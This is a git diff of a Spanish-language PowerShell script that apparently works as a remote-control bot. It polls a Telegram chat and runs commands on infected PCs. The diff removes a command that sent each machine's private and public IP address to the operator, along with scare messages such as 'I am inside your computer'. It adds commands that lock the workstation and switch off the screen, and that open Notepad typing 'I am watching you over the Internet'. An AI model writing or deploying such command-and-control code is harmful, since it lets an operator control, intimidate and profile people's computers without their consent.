@@ -60,20 +60,22 @@ while ($true) {
                 $Comando = [string]$Partes[0]
                 $Comando = $Comando.ToLower()
                 
-               $IDDestino = ""
+                $IDDestino = ""
                 if ($Partes.Count -gt 1) {
                     $IDDestino = [string]$Partes[1]
                 }
 
-                # CALCULAR ID DE 3 DÍGITOS ESTABLE (Fijo y único para cada PC)
-                $Md5 = [System.Security.Cryptography.MD5]::Create()
-                $HashBytes = $Md5.ComputeHash([System.Text.Encoding]::ASCII.GetBytes($MiPC))
-                $IdUnico = ([BitConverter]::ToUInt16($HashBytes, 0) % 900) + 100
-                $MiIDNum = [string]$IdUnico
-
                 # --- COMANDO GLOBAL: /lista ---
                 if ($Comando -eq "/lista") {
-                    $RespuestaLista = "🖥️ EQUIPO EN LINEA:`nID Numerico: [" + $MiIDNum + "] -> " + $User + "@" + $MiPC
+                    # Calcula un ID del 1 al 9 único y fijo para esta PC según su nombre
+                    $LetrasPC = [char[]]$MiPC
+                    $TotalAscii = 0
+                    foreach ($Letra in $LetrasPC) { $TotalAscii += [int]$Letra }
+                    $Seed = $TotalAscii % 9
+                    if ($Seed -eq 0) { $Seed = 1 }
+                    $NumAsignado = [string]$Seed
+
+                    $RespuestaLista = "🖥️ EQUIPO EN LINEA:`nID Numerico: [" + $NumAsignado + "] -> " + $User + "@" + $MiPC
                     [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $RespuestaLista })
                     continue
                 }
@@ -85,56 +87,52 @@ while ($true) {
                                   "• /lista - Ver que numero de ID tomo cada PC.`n" +
                                   "• /ayuda - Ver este menu.`n`n" +
                                   "Comandos Individuales (Deja un espacio y pon el numero de la PC):`n" +
-                                  " /cuenta [Numero]`n" +
-                                  " /dentro [Numero]`n" +
-                                  " /notepad [Numero]`n" +
-                                  " /red [Numero]`n`n" +
-                                  "Ejemplo de uso: /red " + $MiIDNum
+                                  "• /pantalla_off [Numero]`n" +
+                                  "• /pantalla_on [Numero]`n" +
+                                  "• /notepad [Numero]`n`n" +
+                                  "Ejemplo de uso: /notepad 1"
                     
                     [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAyuda })
                     continue
                 }
 
+                # CALCULAR MI PROPIO ID PARA COMPARAR
+                $MisLetras = [char[]]$MiPC
+                $MiAscii = 0
+                foreach ($M in $MisLetras) { $MiAscii += [int]$M }
+                $MiSeed = $MiAscii % 9
+                if ($MiSeed -eq 0) { $MiSeed = 1 }
+                $MiIDNum = [string]$MiSeed
+
                 # VALIDACIÓN CRÍTICA: Solo ejecuta si el número coincide con el de esta máquina
                 if ($IDDestino -eq $MiIDNum -and $IDDestino -ne "") {
                     
                     switch ($Comando) {
-                        
-                        "/dentro" {
-                            Add-Type -AssemblyName System.Speech
-                            $synthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer
-                            $synthesizer.Speak("Hola. Estoy dentro de tu computadora.")
-                        }                       
-                        
-                        "/cuenta" {
-                            $wsh = New-Object -ComObject WScript.Shell
-                            for ($i = 60; $i -gt 0; $i--) {
-                                $wsh.Popup("Faltan $i segundos para desbloquear la pantalla.", 1, "Cuenta Regresiva", 0 + 48 + 4096)
-                            }
+                        "/pantalla_off" {
+                            $rundll = New-Object -ComObject WScript.Shell
+                            $rundll.Run("rundll32.exe user32.dll,LockWorkStation")
+                            [Win32.Win32Utils]::SendMessage(-1, 0x0112, 0xF170, 2)
+                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Pantalla apagada en ID " + $MiIDNum })
                         }
-                           
+                        "/pantalla_on" {
+                            $wsh = New-Object -ComObject WScript.Shell
+                            $wsh.SendKeys("{SHIFT}")
+                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Pantalla encendida en ID " + $MiIDNum })
+                        }
                         "/notepad" {
-                            Start-Process "notepad.exe"
+                            notepad.exe
                             Start-Sleep -Milliseconds 500
                             $wsh = New-Object -ComObject WScript.Shell
                             $wsh.SendKeys("Te estoy observando por Internet... 👀")
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
-                        }
-
-                        "/red" {
-                            $IpPrivada = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" -and $_.InterfaceAlias -notlike "*Virtual*" -and $_.IPAddress -notlike "127.*" }).IPAddress | Select-Object -First 1
-                            $IpPublica = "Desconocida"
-                            try {
-                                $IpPublica = (Invoke-RestMethod -Uri "https://ipify.org" -TimeoutSec 5).Trim()
-                            } catch {}
-
-                            $ReporteRed = " REPORTE DE RED (ID: " + $MiIDNum + ")`n" +
-                                          " IP Privada (Local): " + $IpPrivada + "`n" +
-                                          " IP Pública (Internet): " + $IpPublica
-                                          
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $ReporteRed })
+                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
                         }
                     }
                 }
             }
         }
+    } catch {
+        Start-Sleep -Seconds 3
+    }
+    Start-Sleep -Seconds 2
+}
+
